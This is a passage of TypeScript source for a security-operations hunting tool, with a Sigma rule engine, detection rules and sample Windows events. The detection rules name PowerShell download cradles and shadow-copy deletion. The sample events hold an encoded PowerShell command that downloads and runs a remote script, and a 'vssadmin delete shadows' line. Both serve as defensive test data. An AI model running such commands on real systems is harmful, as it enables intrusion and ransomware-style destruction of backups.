sys.exit(main())\n"}, {"name": ".github/workflows/playbooks.yml", "data": "name: playbooks\n# No \"paths\" filter on purpose: a required status check that never runs leaves a pull request\n# waiting forever. The lint is fast, and it passes when no playbook changed.\non:\n  pull_request:\n  push:\n    branches: [main]\npermissions:\n  contents: read\njobs:\n  lint:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n        with:\n          fetch-depth: 0\n      - name: Lint playbooks\n        run: |\n          if [ \"${{ github.event_name }}\" = \"pull_request\" ]; then\n            python3 tools/playbook_lint.py --base \"origin/${{ github.base_ref }}\"\n          else\n            python3 tools/playbook_lint.py\n          fi\n"}, {"name": ".github/CODEOWNERS", "data": "# Replace @your-org/soc-leads with real people or a team BEFORE turning on branch protection.\n# tools/protect_main.sh refuses to run while the placeholder is still here.\n# The lint, the workflows and the database rules are owned too, so nobody can weaken the\n# checks in the same pull request that needs them.\n/playbooks/   @your-org/soc-leads\n/tools/       @your-org/soc-leads\n/.github/     @your-org/soc-leads\n/supabase/    @your-org/soc-leads\n/api/schema.sql @your-org/soc-leads\n"}, {"name": "tools/GIT_SETUP.md", "data": "# Playbooks in git\n\n1. Commit the `playbooks/` folder, `tools/playbook_lint.py` and `.github/` to a repository.\n2. In GitHub: Settings, Branches, add a rule for `main`:\n   - Require a pull request before merging\n   - Require approvals (1 or more) and **Require review from Code Owners**\n   - Require status checks to pass: `lint`\n   - Dismiss stale approvals when new commits are pushed\n3. Edit `.github/CODEOWNERS` so it names your real reviewers.\n\nNow a playbook change needs a second person and passing checks. The lint is the same\nrule set as the app (`11 sections in order, no secrets, numbered steps, escalation path,\nversion bumped by one`).\n\nRound trip: export from the app's Playbooks page, commit, review in a pull request, then\nimport the merged `.md` files back with \"import .md files\" (they arrive as drafts, so the\napp's checks run again).\n\n## Automatic setup\n\n`tools/protect_main.sh OWNER/REPO --dry-run` prints the rule; without `--dry-run` it applies it with the GitHub CLI (`gh auth login` first, as a repo admin). Put real reviewers in `.github/CODEOWNERS` first. The script refuses otherwise.\n"}];

// ---- decoding ----
function decodeB64s(t:string):{src:string;text:string}[]{const out:{src:string;text:string}[]=[];const seen:any={};
 const dec=(b:string,u16:boolean):string=>{try{let x=b.replace(/-/g,'+').replace(/_/g,'/');while(x.length%4)x+='=';const bin=atob(x);const u=new Uint8Array(bin.length);for(let i=0;i<bin.length;i++)u[i]=bin.charCodeAt(i);const s=new TextDecoder(u16?'utf-16le':'utf-8').decode(u);const pr=s.length?(s.match(/[\x20-\x7e\r\n\t]/g)||[]).length/s.length:0;return pr>0.9&&s.length>3?s:''}catch(e){return ''}};
 const add=(src:string,text:string)=>{if(!text||seen[src])return;seen[src]=1;out.push({src:src.slice(0,60)+(src.length>60?'...':''),text:text.slice(0,2000)})};
 const re1=/-(?:e|ec|enc|encodedcommand)\s+['"]?([A-Za-z0-9+\/]{16,}={0,2})/gi;let m:any;
 while((m=re1.exec(t))){add(m[1],dec(m[1],true)||dec(m[1],false))}
 const re2=/\b[A-Za-z0-9+\/]{40,}={0,2}/g;
 while((m=re2.exec(t))){if(seen[m[0]])continue;add(m[0],dec(m[0],false)||dec(m[0],true))}
 return out}

// ---- minimal YAML (enough for Sigma rules) ----
function stripC(l:string):string{let q='';for(let i=0;i<l.length;i++){const c=l[i];if(q){if(c===q)q=''}else if(c==='"'||c==="'")q=c;else if(c==='#'&&(i===0||/\s/.test(l[i-1])))return l.slice(0,i)}return l}
function splitTop(s:string):string[]{const o:string[]=[];let cur='',q='';for(const c of s){if(q){cur+=c;if(c===q)q=''}else if(c==='"'||c==="'"){q=c;cur+=c}else if(c===','){o.push(cur);cur=''}else cur+=c}if(cur.trim())o.push(cur);return o}
function yamlLite(text:string):any{
 const L:{i:number;t:string}[]=[];text.replace(/\t/g,'  ').split(/\r?\n/).forEach((r:string)=>{const s=stripC(r);if(!s.trim())return;L.push({i:s.search(/\S/),t:s.trim()})});
 let p=0;
 const scalar=(v:string):any=>{v=v.trim();if(v==='')return '';if((v[0]==='"'&&v.endsWith('"')&&v.length>1)||(v[0]==="'"&&v.endsWith("'")&&v.length>1)){const q=v[0];const b=v.slice(1,-1);return q==="'"?b.replace(/''/g,"'"):b.replace(/\\(["\\])/g,'$1')}
  if(v[0]==='['&&v.endsWith(']')){const inner=v.slice(1,-1).trim();return inner?splitTop(inner).map(scalar):[]}
  if(/^-?\d+$/.test(v))return +v;if(v==='true')return true;if(v==='false')return false;if(v==='null'||v==='~')return null;return v};
 const isItem=(t:string)=>t==='-'||t.startsWith('- ');
 const block=(ind:number):any=>{
  if(p>=L.length)return null;
  if(isItem(L[p].t)){const arr:any[]=[];
   while(p<L.length&&L[p].i===ind&&isItem(L[p].t)){const rest=L[p].t.slice(1).trim();
    if(rest===''){p++;arr.push(p<L.length&&L[p].i>ind?block(L[p].i):null)}
    else if(/^[A-Za-z0-9_|.-]+:(\s|$)/.test(rest)){throw new Error('unsupported YAML: a list of maps')}
    else{arr.push(scalar(rest));p++}}
   return arr}
  const obj:any={};
  while(p<L.length&&L[p].i===ind&&!isItem(L[p].t)){const m=L[p].t.match(/^((?:"[^"]*"|'[^']*'|[^:'"])+?):(?:\s+(.*))?$/);if(!m)throw new Error('cannot read: '+L[p].t);
   const k=m[1].trim().replace(/^['"]|['"]$/g,'');const v=m[2];p++;
   if(v===undefined||v===''){obj[k]=(p<L.length&&(L[p].i>ind||(L[p].i===ind&&isItem(L[p].t))))?block(L[p].i):null}
   else if(v==='|'||v==='>'){const parts:string[]=[];while(p<L.length&&L[p].i>ind){parts.push(L[p].t);p++}obj[k]=parts.join(v==='|'?'\n':' ')}
   else obj[k]=scalar(v)}
  return obj};
 if(!L.length)return {};
 const r=block(L[0].i);if(p<L.length)throw new Error('could not read the whole file near: '+L[p].t);return r}

// ---- Sigma subset ----
const SPRAY_USERS=5;
const LV:any={informational:1,low:2,medium:3,high:4,critical:5};
interface Hit{id:string;title:string;level:string;tags:string[];playbook:string;desc:string;kind:string;evs:any[]}
function flat(o:any,pre:string,out:any,d?:number){d=d||0;if(o===null||o===undefined||d>40)return;
 if(Array.isArray(o)){
  // Windows event JSON often carries EventData as [{"@Name":"CommandLine","#text":"..."}]. Turn those into named fields.
  if(o.length&&o.every((x:any)=>x&&typeof x==='object'&&!Array.isArray(x)&&(typeof x['@Name']==='string'||typeof x.Name==='string')&&('#text' in x||'text' in x||'#value' in x||'Value' in x))){
   o.forEach((x:any)=>{const n=String(x['@Name']||x.Name);const v=x['#text']!==undefined?x['#text']:x.text!==undefined?x.text:x['#value']!==undefined?x['#value']:x.Value;out[(pre?pre+'.':'')+n.toLowerCase()]=String(v)});return}
  if(o.every((x:any)=>typeof x!=='object'||x===null)){out[pre.toLowerCase()]=o.join(', ');return}
  o.forEach((x:any,i:number)=>flat(x,pre+'.'+i,out,d+1));return}
 if(typeof o==='object'){Object.keys(o).forEach((k:string)=>flat(o[k],pre?pre+'.'+k:k,out,d+1));return}
 out[pre.toLowerCase()]=String(o)}
function mkEv(raw:any):any{const f:any={};flat(raw,'',f);return{raw,f,text:JSON.stringify(raw).toLowerCase()}}
const ALIAS:any={image:['image','newprocessname','processname','process.executable'],commandline:['commandline','processcommandline','process.command_line'],parentimage:['parentimage','parentprocessname','process.parent.executable'],parentcommandline:['parentcommandline','process.parent.command_line'],eventid:['eventid','event_id','event.code'],targetfilename:['targetfilename'],user:['user','username','user.name'],ipaddress:['ipaddress','srcip','sourcenetworkaddress','source.ip','sourceip']};
function field(f:any,name:string):string[]{const lf=name.toLowerCase();const names:string[]=ALIAS[lf]||[lf];const r:string[]=[];for(const k in f){for(const n of names){if(k===n||k.endsWith('.'+n)){r.push(f[k]);break}}}return r}
const yieldUi=()=>new Promise<void>(res=>setTimeout(res,0));
async function budget<T>(arr:T[],fn:(x:T,i:number)=>void,ms?:number){const lim=ms||20;let t=performance.now();for(let i=0;i<arr.length;i++){fn(arr[i],i);if((i&15)===15&&performance.now()-t>lim){await yieldUi();t=performance.now()}}}
async function parseEvents(txt:string):Promise<{evs:any[];err:string}>{txt=txt.trim();if(!txt)return{evs:[],err:''};let arr:any[]=[];let bad=0;
 let whole=true;try{const j=JSON.parse(txt);arr=Array.isArray(j)?j:[j]}catch(e){whole=false}
 if(!whole){const lines=txt.split(/\r?\n/).filter((l:string)=>l.trim());await budget(lines,(l:string)=>{try{arr.push(JSON.parse(l))}catch(e2){bad++}})}
 arr=arr.filter((x:any)=>x&&typeof x==='object'&&!Array.isArray(x));
 if(!arr.length)return{evs:[],err:'Could not read any JSON events. Use a JSON array, one JSON object, or one object per line.'};
 let err=bad?bad+' line'+(bad===1?' was':'s were')+' not valid JSON and '+(bad===1?'was':'were')+' skipped.':'';
 if(arr.length>20000){arr=arr.slice(0,20000);err+=' Only the first 20,000 events were read.'}
 const evs:any[]=new Array(arr.length);await budget(arr,(x:any,i:number)=>{evs[i]=mkEv(x)});
 return{evs,err:err.trim()}}
const GC:any={};const globRe=(s:string):RegExp=>GC[s]||(GC[s]=new RegExp('^'+s.replace(/[.+^${}()|[\]\\]/g,'\\$&').replace(/\*/g,'.*').replace(/\?/g,'.')+'$'));
function selTest(sel:any,ev:any):boolean{
 if(Array.isArray(sel))return sel.some((v:any)=>ev.text.includes(String(v).toLowerCase()));
 if(!sel||typeof sel!=='object')return false;
 return Object.keys(sel).every((k:string)=>{const parts=k.split('|');const f=parts[0];const mods=parts.slice(1).map((x:string)=>x.toLowerCase());
  mods.forEach((m:string)=>{if(['contains','startswith','endswith','re','all'].indexOf(m)<0)throw new Error('unsupported modifier: '+m)});
  const vals:any[]=Array.isArray(sel[k])?sel[k]:[sel[k]];const have=field(ev.f,f);
  if(!have.length)return vals.some((v:any)=>v===null);
  const one=(h:string,v:any):boolean=>{if(v===null)return h==='';const hs=h.toLowerCase();const vs=String(v).toLowerCase();
   if(mods.indexOf('re')>=0)return new RegExp(String(v),'i').test(h);
   if(mods.indexOf('contains')>=0)return hs.includes(vs);if(mods.indexOf('startswith')>=0)return hs.startsWith(vs);if(mods.indexOf('endswith')>=0)return hs.endsWith(vs);
   if(/[*?]/.test(vs))return globRe(vs).test(hs);return hs===vs};
  const ok=(v:any)=>have.some((h:string)=>one(h,v));
  return mods.indexOf('all')>=0?vals.every(ok):vals.some(ok)})}
function evalCond(cond:string,sels:any,test:(n:string)=>boolean):boolean{
 const toks=cond.match(/\(|\)|[^\s()]+/g)||[];let i=0;const names=Object.keys(sels);
 const pat=(p:string)=>p==='them'?names:names.filter((n:string)=>globRe(p).test(n));
 const atom=():boolean=>{const t=toks[i++];if(t===undefined)throw new Error('condition ended early');
  if(t==='('){const v=or();if(toks[i++]!==')')throw new Error('missing )');return v}
  const lw=t.toLowerCase();
  if((lw==='1'||lw==='all')&&toks[i]&&toks[i].toLowerCase()==='of'){i++;const p=toks[i++];if(!p)throw new Error('missing name after "of"');const ns=pat(p);if(!ns.length)throw new Error('no selection matches '+p);return lw==='all'?ns.every(test):ns.some(test)}
  if(!(t in sels))throw new Error('unknown selection: '+t);return test(t)};
 const not=():boolean=>{if(toks[i]&&toks[i].toLowerCase()==='not'){i++;return !not()}return atom()};
 const and=():boolean=>{let v=not();while(toks[i]&&toks[i].toLowerCase()==='and'){i++;const r=not();v=v&&r}return v};
 const or=():boolean=>{let v=and();while(toks[i]&&toks[i].toLowerCase()==='or'){i++;const r=and();v=v||r}return v};
 const v=or();if(i<toks.length)throw new Error('unexpected "'+toks[i]+'" in condition');return v}
function sigmaPrep(y:any):any{if(!y||typeof y!=='object'||!y.detection||typeof y.detection!=='object')throw new Error('no detection section');
 const det=y.detection;if(typeof det.condition!=='string')throw new Error('condition must be a single string');
 const sels:any={};Object.keys(det).forEach((k:string)=>{if(k!=='condition'&&k!=='timeframe')sels[k]=det[k]});
 const parts=det.condition.split('|');const cond=parts[0].trim();let agg:any=null;
 if(parts.length>2)throw new Error('only one aggregation (| count ...) is supported');
 if(parts.length===2){const m=parts[1].trim().match(/^count\(\s*([A-Za-z0-9_.@-]*)\s*\)\s*(?:by\s+([A-Za-z0-9_.@-]+)\s*)?(>=|<=|>|<|=)\s*(\d+)$/i);if(!m)throw new Error('unsupported aggregation: '+parts[1].trim()+' (use: count() or count(field), optional by field, then a comparison and a number)');agg={fld:m[1],by:m[2]||'',op:m[3],n:+m[4]}}
 evalCond(cond,sels,()=>false);
 return{agg,title:String(y.title||'untitled rule'),desc:String(y.description||''),level:String(y.level||'medium').toLowerCase(),tags:(Array.isArray(y.tags)?y.tags:[]).map(String),playbook:y.playbook?String(y.playbook):'',sels,cond}}
function sigmaMatch(r:any,ev:any):boolean{return evalCond(r.cond,r.sels,(n:string)=>selTest(r.sels[n],ev))}
const BUILTIN_RULES:string[]=[String.raw`title: Encoded PowerShell command line
description: A PowerShell command line uses -enc or -EncodedCommand, which is often used to hide what it runs.
level: high
playbook: suspicious-powershell
tags:
  - attack.execution
  - attack.t1059.001
detection:
  selection_img:
    Image|endswith:
      - '\powershell.exe'
      - '\pwsh.exe'
  selection_cli:
    CommandLine|contains:
      - ' -enc '
      - ' -encodedcommand '
      - ' -e '
  condition: selection_img and selection_cli`,
String.raw`title: PowerShell download cradle
description: PowerShell fetches content from the network and may run it.
level: high
playbook: suspicious-powershell
tags:
  - attack.execution
  - attack.t1059.001
  - attack.command_and_control
detection:
  selection_img:
    Image|endswith:
      - '\powershell.exe'
      - '\pwsh.exe'
  selection_dl:
    CommandLine|contains:
      - 'downloadstring'
      - 'downloadfile'
      - 'invoke-webrequest'
      - 'net.webclient'
      - 'iex('
  condition: selection_img and selection_dl`,
String.raw`title: Member added to a privileged group
description: A user or service account was added to a group with admin in its name, which can grant wide access.
level: high
playbook: account-manipulation
tags:
  - attack.persistence
  - attack.privilege_escalation
  - attack.t1098
detection:
  selection_evt:
    EventID: [4728, 4732, 4756]
  selection_grp:
    TargetUserName|contains: admin
  condition: selection_evt and selection_grp`,
String.raw`title: Security agent service stopped
description: A service control event shows a security agent service entering the stopped state.
level: medium
playbook: agent-offline
tags:
  - attack.defense_evasion
  - attack.t1562.001
detection:
  selection_evt:
    EventID: 7036
  selection_svc:
    Param1|contains: [wazuh, defender, sense, sysmon, crowdstrike, carbonblack, sentinel]
  selection_state:
    Param2: stopped
  condition: all of selection_*`,
String.raw`title: Shadow copies deleted
description: Volume shadow copies are deleted, which is a common step before ransomware encrypts files.
level: critical
tags:
  - attack.impact
  - attack.t1490
detection:
  selection_vssadmin:
    CommandLine|contains|all:
      - vssadmin
      - delete
      - shadows
  selection_wmic:
    CommandLine|contains|all:
      - shadowcopy
      - delete
  condition: 1 of selection_*`];
function tacticsOf(tags:string[]):{tac:string[];tech:string[]}{const tac:string[]=[];const tech:string[]=[];tags.forEach((t:string)=>{const x=t.toLowerCase().replace(/^attack\./,'');if(/^t\d{4}(\.\d{3})?$/.test(x)){tech.push(x.toUpperCase());return}
  const name=x.replace(/[_-]/g,' ');const hit=TACTICS.find((q:string)=>q.toLowerCase()===name);if(hit&&tac.indexOf(hit)<0)tac.push(hit)});return{tac,tech}}
const evTime=(e:any):string=>{for(const k of ['timestamp','@timestamp','systemtime','timecreated','utctime']){const v=field(e.f,k)[0];if(v)return v}return ''};
const evHost=(e:any):string=>e.f['agent.name']||field(e.f,'computername')[0]||field(e.f,'computer')[0]||field(e.f,'hostname')[0]||'';
const evUser=(e:any):string=>field(e.f,'targetusername')[0]||field(e.f,'subjectusername')[0]||field(e.f,'user')[0]||'';
function wazuhPlaybook(d:string):string{return /powershell/i.test(d)?'suspicious-powershell':/group|admin|privilege|account/i.test(d)?'account-manipulation':/agent|disconnect|stopped|keepalive/i.test(d)?'agent-offline':'triage'}
let BUILTIN_PREP:any[]|null=null;
async function runHunt(evs:any[],extra:any[]):Promise<{hits:Hit[];errors:string[]}>{
 const hits:Hit[]=[];const errors:string[]=[];
 if(!BUILTIN_PREP){BUILTIN_PREP=BUILTIN_RULES.map((t:string)=>{try{return sigmaPrep(yamlLite(t))}catch(e:any){errors.push('built-in rule: '+e.message);return null}}).filter(Boolean)}
 const rules=(BUILTIN_PREP as any[]).concat(extra);
 for(const r of rules){try{const m:any[]=[];await budget(evs,(e:any)=>{if(sigmaMatch(r,e))m.push(e)});
  if(r.agg&&m.length){const g:any={};m.forEach((e:any)=>{const k=r.agg.by?(field(e.f,r.agg.by)[0]||'(none)'):'all';(g[k]=g[k]||[]).push(e)});
   const cmp=(v:number)=>r.agg.op==='>'?v>r.agg.n:r.agg.op==='>='?v>=r.agg.n:r.agg.op==='<'?v<r.agg.n:r.agg.op==='<='?v<=r.agg.n:v===r.agg.n;
   Object.keys(g).forEach((k:string)=>{const val=r.agg.fld?new Set(g[k].map((e:any)=>field(e.f,r.agg.fld)[0]).filter((x:any)=>x!==undefined)).size:g[k].length;if(cmp(val))hits.push({id:'s:'+r.title+':'+k,title:r.title+(r.agg.by?' ('+k+')':''),level:r.level,tags:r.tags,playbook:r.playbook,desc:r.desc+' ['+(r.agg.fld?'distinct '+r.agg.fld:'events')+': '+val+']',kind:'sigma',evs:g[k]})});continue}
  if(m.length)hits.push({id:'s:'+r.title,title:r.title,level:r.level,tags:r.tags,playbook:r.playbook,desc:r.desc,kind:'sigma',evs:m})}catch(e:any){errors.push('rule "'+r.title+'": '+e.message)}}
 const wz:any={};await budget(evs,(e:any)=>{const id=e.f['rule.id'];if(id)(wz[id]=wz[id]||[]).push(e)});
 Object.keys(wz).forEach((id:string)=>{const g=wz[id];const d=g[0].f['rule.description']||('Wazuh rule '+id);const lv=+(g[0].f['rule.level']||0);
  const tags:string[]=[];(g[0].f['rule.mitre.tactic']||'').split(', ').filter(Boolean).forEach((t:string)=>tags.push('attack.'+t.toLowerCase().replace(/ /g,'_')));(g[0].f['rule.mitre.id']||'').split(', ').filter(Boolean).forEach((t:string)=>tags.push('attack.'+t.toLowerCase()));
  hits.push({id:'w:'+id,title:'Wazuh '+id+': '+d,level:lv>=12?'critical':lv>=10?'high':lv>=7?'medium':'low',tags,playbook:wazuhPlaybook(d),desc:d,kind:'wazuh',evs:g})});
 const by:any={};
 await budget(evs,(e:any)=>{if(field(e.f,'eventid')[0]==='4625'||(e.f['rule.groups']||'').indexOf('authentication_failed')>=0){const ip=field(e.f,'ipaddress')[0];if(ip&&ip!=='-'&&ip!=='::1'&&ip!=='127.0.0.1')(by[ip]=by[ip]||[]).push(e)}});
 Object.keys(by).forEach((ip:string)=>{const users=new Set(by[ip].map((e:any)=>evUser(e).toLowerCase()).filter(Boolean));if(users.size>=SPRAY_USERS)hits.push({id:'t:'+ip,title:'Possible password spraying from '+ip,level:'high',tags:['attack.credential_access','attack.t1110.003'],playbook:'',desc:users.size+' different accounts failed to log on from one source.',kind:'threshold',evs:by[ip]})});
 hits.sort((a:Hit,b:Hit)=>(LV[b.level]||0)-(LV[a.level]||0)||b.evs.length-a.evs.length);
 return{hits,errors}}
function traceFromHit(h:Hit):TimelineEvent[]{
 const rawLimit=Math.min(4000,Math.max(200,Math.floor(150000/Math.max(1,Math.min(h.evs.length,120)))));
 return h.evs.slice(0,120).map((e:any,i:number)=>{
  const rawFull=JSON.stringify(e.raw);
  const desc=String(e.f['rule.description']||field(e.f,'commandline')[0]||field(e.f,'message')[0]||h.title).slice(0,200);
  const eid=field(e.f,'eventid')[0];
  return {id:'hunt-'+i+'-'+hash32(rawFull),at:evTime(e),kind:'detection',summary:(eid?'Event '+eid+' · ':'')+desc,
   asset:evHost(e),actor:evUser(e),source:'Hunt · '+h.title,note:'Imported from '+h.evs.length+' matching event(s). Review the raw record before drawing conclusions.',
   raw:rawFull.slice(0,rawLimit),truncated:rawFull.length>rawLimit};
 });
}
function hash32(x:string):string{let h=2166136261;for(let i=0;i<x.length;i++){h^=x.charCodeAt(i);h=Math.imul(h,16777619)}return (h>>>0).toString(16).padStart(8,'0')}
function caseFromHit(h:Hit):any{const evs=h.evs;const tm=evs.map(evTime).filter(Boolean).sort();const t1=tm[0]||'unknown time',t2=tm[tm.length-1]||t1;
 const hosts=[...new Set(evs.map(evHost).filter(Boolean))].slice(0,6) as string[];const users=[...new Set(evs.map(evUser).filter(Boolean))].slice(0,6) as string[];
 const first=evs[0];const keyFacts=['commandline','image','targetusername','membername','param1','param2','ipaddress','srcip'].map((k:string)=>{const v=field(first.f,k)[0];return v?k+' = '+String(v).slice(0,160):''}).filter(Boolean);
 const {tac,tech}=tacticsOf(h.tags);const assets=[...hosts,...users.filter((u:string)=>hosts.indexOf(u)<0)].slice(0,8);
 const iocs=extractIocs(evs.slice(0,3).map((e:any)=>JSON.stringify(e.raw)).join('\n')+'\n'+decodeB64s(evs.slice(0,3).map((e:any)=>JSON.stringify(e.raw)).join('\n')).map((d:any)=>d.text).join('\n')).filter((x:any)=>x.note!=='internal'&&x.k!=='Domain').slice(0,8);
 return{...caseBlank(),name:h.title.slice(0,80)+(hosts[0]?' on '+hosts[0]:''),cat:(h.kind==='wazuh'?'Wazuh alert group: ':h.kind==='threshold'?'Hunt threshold: ':'Hunt rule: ')+h.title,assets,
  problem:evs.length+' event'+(evs.length===1?'':'s')+' matched "'+h.title+'". First at '+t1+', last at '+t2+'.'+(hosts.length?' Host: '+hosts.join(', ')+'.':'')+(users.length?' Account: '+users.join(', ')+'.':'')+(keyFacts.length?' First event: '+keyFacts.join('; ')+'.':''),
  why:h.desc,whynow:'First match '+t1+'. Last match '+t2+'.',
  findings:[{t:h.title.slice(0,90)+(tech[0]?' ('+tech[0]+')':''),c:'open',s:LV[h.level]||3,th:tac[0]||TACTICS[2],a:assets}],
  evidence:[...iocs.map((x:any)=>({k:'IOC',t:x.t,g:'Hunt: '+h.title})),{k:'Log',t:'Matched '+evs.length+' event'+(evs.length===1?'':'s')+(keyFacts[0]?'. First: '+keyFacts[0]:''),g:'Hunt: '+h.title}],
  timeline:traceFromHit(h),ci:7,pushed:true,chat:[{r:'sal',t:'Case opened from a hunt hit. Matching source events were captured in Timeline (up to 120); validate them before making conclusions.'}]}}
function mkRun(p:PB):Run{return{id:'r'+Date.now(),pb:p.id,pbName:p.name,v:p.v,at:Date.now(),done:0,steps:pbSteps(p.body).map((x:any)=>({n:x.n,t:x.t,appr:x.appr,st:'todo',note:'',by:'',at:0})),verdict:'',note:''}}
const SAMPLE_EVENTS=[
 {timestamp:'2026-11-22T02:14:09Z',agent:{name:'FIN-DC01'},rule:{id:'60111',level:12,description:'User added to a security-enabled group',mitre:{id:['T1098'],tactic:['Persistence']}},data:{win:{system:{eventID:'4728',computer:'FIN-DC01'},eventdata:{targetUserName:'Domain Admins',memberName:'CN=svc-backup,OU=Service,DC=corp,DC=example',subjectUserName:'j.rivera'}}}},
 {timestamp:'2026-11-22T02:09:41Z',agent:{name:'FIN-WS22'},data:{win:{system:{eventID:'4688'},eventdata:{image:'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',commandLine:'powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMgAwADMALgAwAC4AMQAxADMALgA1ADAALwBhAC4AcABzADEAJwApAA==',user:'svc-backup'}}}},
 {timestamp:'2026-11-22T02:20:11Z',agent:{name:'FIN-FS01'},data:{win:{system:{eventID:'4688'},eventdata:{image:'C:\\Windows\\System32\\vssadmin.exe',commandLine:'vssadmin.exe delete shadows /all /quiet',user:'svc-backup'}}}},
 {timestamp:'2026-11-22T03:01:00Z',agent:{name:'FIN-WS07'},data:{win:{system:{eventID:'7036'},eventdata:{param1:'Wazuh',param2:'stopped'}}}},
 ...['a.smith','b.jones','c.lee','d.khan','e.ortiz','f.nguyen'].map((u:string,i:number)=>({timestamp:'2026-11-22T01:0'+i+':30Z',agent:{name:'VPN-GW'},data:{win:{system:{eventID:'4625'},eventdata:{targetUserName:u,ipAddress:'198.51.100.77'}}}})),
 {timestamp:'2026-11-22T01:30:00Z',agent:{name:'FIN-WS09'},data:{win:{system:{eventID:'4688'},eventdata:{image:'C:\\Windows\\System32\\notepad.exe',commandLine:'notepad.exe notes.txt',user:'m.garcia'}}}}];

// ---- zip + git kit ----
const CRCT=(()=>{const t:number[]=[];for(let n=0;n<256;n++){let c=n;for(let k=0;k<8;k++)c=c&1?0xEDB88320^(c>>>1):c>>>1;t.push(c>>>0)}return t})();
function crc32(b:Uint8Array):number{let c=0xFFFFFFFF;for(let i=0;i<b.length;i++)c=CRCT[(c^b[i])&255]^(c>>>8);return (c^0xFFFFFFFF)>>>0}
function makeZip(files:{name:string;data:string}[]):Blob{const enc=new TextEncoder();const parts:Uint8Array[]=[];const cen:Uint8Array[]=[];let off=0;
 files.forEach((f:any)=>{const nm=enc.encode(f.name),d=enc.encode(f.data),crc=crc32(d);
  const h=new DataView(new ArrayBuffer(30));h.setUint32(0,0x04034b50,true);h.setUint16(4,20,true);h.setUint16(6,0x0800,true);h.setUint16(8,0,true);h.setUint16(10,0,true);h.setUint16(12,0x21,true);h.setUint32(14,crc,true);h.setUint32(18,d.length,true);h.setUint32(22,d.length,true);h.setUint16(26,nm.length,true);h.setUint16(28,0,true);
  parts.push(new Uint8Array(h.buffer),nm,d);
  const c=new DataView(new ArrayBuffer(46));c.setUint32(0,0x02014b50,true);c.setUint16(4,20,true);c.setUint16(6,20,true);c.setUint16(8,0x0800,true);c.setUint16(10,0,true);c.setUint16(12,0,true);c.setUint16(14,0x21,true);c.setUint32(16,crc,true);c.setUint32(20,d.length,true);c.setUint32(24,d.length,true);c.setUint16(28,nm.length,true);c.setUint16(30,0,true);c.setUint16(32,0,true);c.setUint16(34,0,true);c.setUint16(36,0,true);c.setUint32(38,0,true);c.setUint32(42,off,true);
  cen.push(new Uint8Array(c.buffer),nm);off+=30+nm.length+d.length});
 const cs=cen.reduce((a:number,b:Uint8Array)=>a+b.length,0);const e=new DataView(new ArrayBuffer(22));e.setUint32(0,0x06054b50,true);e.setUint16(8,files.length,true);e.setUint16(10,files.length,true);e.setUint32(12,cs,true);e.setUint32(16,off,true);
 return new Blob([...parts,...cen,new Uint8Array(e.buffer)] as any,{type:'application/zip'})}
const downloadBlob=(b:Blob,name:string)=>{const u=URL.createObjectURL(b);const a=document.createElement('a');a.href=u;a.download=name;document.body.appendChild(a);a.click();a.remove();setTimeout(()=>URL.revokeObjectURL(u),500)};
const playbookFiles=(pbs:PB[])=>pbs.map((p:PB)=>({name:'playbooks/'+(p.kind==='triage'?'triage':'investigation')+'/'+p.name+'.md',data:p.body}));
function approvalBlock(prop:any,by:string,signedIn:boolean,two:boolean):string{if(!two)return '';if(!signedIn)return 'Two-person approval is on. Sign in as a different person in this workspace, load the playbook library, and approve there.';if(prop&&prop.by===by)return 'Two-person approval is on. A different person must approve this change. You proposed it.';return ''}

// ---- Hunt page ----
const HUNT_CACHE:any={};
function Hunt({s,up,lib,upLib,go}:any){
 const [txt,setTxt]=useState('');const [big,setBig]=useState<any>(null);const BIG=200000;const [rules,setRules]=useState('');const [res,setRes0]=useState<any>(HUNT_CACHE.res||null);const setRes=(r:any)=>{HUNT_CACHE.res=r;setRes0(r)};const [msg,setMsg]=useState(HUNT_CACHE.msg||'');const [nEv,setNEv]=useState(HUNT_CACHE.n||0);const [open,setOpen]=useState('');
 const [busy,setBusy]=useState(false);
 const run=async()=>{if(busy)return;setBusy(true);setMsg('Reading events...');const t0=performance.now();try{await yieldUi();const pe=await parseEvents(big?big.text:txt);if(!pe.evs.length){setRes(null);setMsg(pe.err||'Paste some events first.');return}
  const extra:any[]=[];const errs:string[]=[];
  if(rules.trim()){rules.split(/^---\s*$/m).filter((x:string)=>x.trim()).forEach((chunk:string,i:number)=>{try{extra.push(sigmaPrep(yamlLite(chunk)))}catch(e:any){errs.push('your rule '+(i+1)+': '+e.message)}})}
  setMsg('Running rules on '+pe.evs.length+' events...');await yieldUi();
  const r=await runHunt(pe.evs,extra);r.errors.unshift(...errs);setRes(r);HUNT_CACHE.n=pe.evs.length;setNEv(pe.evs.length);setOpen('');
  const m0=pe.evs.length+' events read. '+r.hits.length+' hit group'+(r.hits.length===1?'':'s')+' found in '+Math.round(performance.now()-t0)+' ms.'+(pe.err?' '+pe.err:'');setMsg(m0);HUNT_CACHE.msg=m0}catch(e:any){setMsg('Hunt failed: '+e.message)}finally{setBusy(false)}};
 const file=(e:any)=>{const f=e.target.files&&e.target.files[0];if(!f)return;if(f.size>8*1024*1024){setMsg('That file is over 8 MB. Split it first.');return}f.text().then((t:string)=>{if(t.length>BIG){setBig({text:t,name:f.name});setTxt('')}else{setBig(null);setTxt(t)}setMsg('Loaded '+f.name+' ('+Math.round(f.size/1024)+' KB). Read in your browser only. Press run hunt.')}).catch(()=>setMsg('Could not read that file.'));e.target.value=''};
 const onPaste=(e:any)=>{const t=e.clipboardData&&e.clipboardData.getData('text');if(t&&t.length>BIG){e.preventDefault();setBig({text:t,name:'pasted text'});setTxt('');setMsg('Large paste held in memory (not shown, to keep the page fast). Press run hunt.')}};
 const asCase=(h:Hit)=>{try{if(s.name||s.findings.length||s.problem)localStorage.setItem('soc1-prev',JSON.stringify(s))}catch(e){}up(caseFromHit(h));go('case')};
 const prevRaw=(()=>{try{return localStorage.getItem('soc1-prev')}catch(e){return null}})();
 const restorePrev=()=>{try{const p=JSON.parse(prevRaw||'null');if(!p)return;localStorage.removeItem('soc1-prev');up(p);go('case')}catch(e){setMsg('Could not restore the previous case.')}};
